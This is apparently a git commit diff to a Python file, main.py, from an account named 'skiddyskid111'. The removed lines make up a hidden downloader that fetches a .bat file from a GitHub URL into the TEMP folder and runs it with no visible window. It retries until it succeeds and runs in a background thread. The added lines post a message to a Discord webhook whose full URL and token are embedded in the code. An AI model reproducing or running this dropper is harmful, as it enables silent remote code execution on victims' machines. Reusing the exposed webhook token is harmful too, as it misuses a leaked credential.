b708de529cbb86f59e6feabb20c3facb67371ee5
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-09-19 19:49:05 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,19 +1,6 @@
-import subprocess
-import os
-import urllib.request
-import time
-import threading
+import requests
 
-def main():
-    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/main.bat'
-    path = os.path.join(os.getenv('TEMP') or '.', 'main.bat')
-    while True:
-        try:
-            urllib.request.urlretrieve(url, path)
-            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
-            break
+url = 'https://discord.com/api/webhooks/1413904009932177559/A25ugwZBZqSiEVOg_ZscIgojk_SQ6bLFKIXjidBx_UkhCNOK-nBvRNgFnrXLqH3NFpDP'
+data = {'content': 'Hi'}
 
-        except:
-            time.sleep(3)
-
-threading.Thread(target=main).start()
+requests.post(url, json=data)
